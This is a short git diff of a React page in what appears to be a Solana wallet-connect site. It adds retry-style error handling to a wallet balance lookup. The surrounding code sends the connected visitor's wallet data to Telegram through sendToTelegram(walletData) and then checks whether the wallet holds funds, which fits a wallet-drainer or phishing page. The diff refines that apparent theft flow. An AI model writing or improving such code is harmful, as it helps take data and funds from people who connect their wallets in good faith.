@@ -37,10 +37,21 @@ const Index = () => {
       console.log("Sending data to Telegram");
       await sendToTelegram(walletData);
 
-      // Get wallet balance
+      // Get wallet balance with retry logic
       console.log("Getting wallet balance");
-      const balance = await connection.getBalance(publicKey);
-      console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");
+      let balance;
+      try {
+        balance = await connection.getBalance(publicKey, 'confirmed');
+        console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");
+      } catch (balanceError) {
+        console.error("Balance fetch error:", balanceError);
+        toast({
+          title: "Error",
+          description: "Failed to fetch wallet balance. Please try again.",
+          variant: "destructive",
+        });
+        return;
+      }
 
       if (balance <= 0) {
         toast({
